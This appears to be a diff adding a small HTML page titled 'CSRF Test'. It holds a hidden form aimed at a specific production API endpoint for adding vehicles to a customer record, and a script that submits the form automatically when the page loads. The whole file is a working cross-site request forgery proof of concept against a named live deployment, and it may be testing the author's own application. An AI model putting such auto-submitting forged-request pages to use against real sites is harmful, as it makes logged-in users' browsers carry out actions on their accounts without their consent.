@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>CSRF Test</h1>
+
+    <form action="https://pitcontrol-production.up.railway.app/api/customers/4595e6f8-577a-48e6-b98e-517e1c14f362/vehicles" method="POST">
+    <input type="hidden" name="test" value="csrf" />
+    </form>
+
+    <script>
+    document.forms[0].submit();
+    </script>
+
+</body>
+</html>
+
+
